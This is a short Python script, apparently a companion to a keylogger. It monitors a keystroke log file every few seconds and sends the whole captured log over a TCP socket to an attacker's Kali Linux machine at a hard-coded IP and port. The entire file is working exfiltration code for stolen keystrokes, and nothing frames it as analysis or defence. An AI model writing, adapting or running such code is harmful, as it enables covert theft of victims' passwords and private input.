import os
import socket
import time

KALI_IP = "192.168.1.66"  # Replace with your Kali Linux IP
PORT = 5555  # Port to send logs to
LOG_FILE = "/var/log/keystroke.log"  # Path to the keylogger log file

# Function to send log data to Kali machine
def send_logs(logfile):
    with open(logfile, "rb") as f:
        data = f.read()

    # Create a socket connection to Kali machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((KALI_IP, PORT))
    s.sendall(data)
    s.close()

# Monitor the log file and send updates when it changes
def monitor_log_file():
    last_size = 0
    while True:
        try:
            # Get the current size of the log file
            current_size = os.path.getsize(LOG_FILE)
            
            # If the file has been updated, send the new data
            if current_size > last_size:
                send_logs(LOG_FILE)
                last_size = current_size
            
            # Wait for a short period before checking again
            time.sleep(2)

        except Exception as e:
            print(f"Error monitoring log file: {e}")
            time.sleep(5)

# Start monitoring the log file
monitor_log_file()
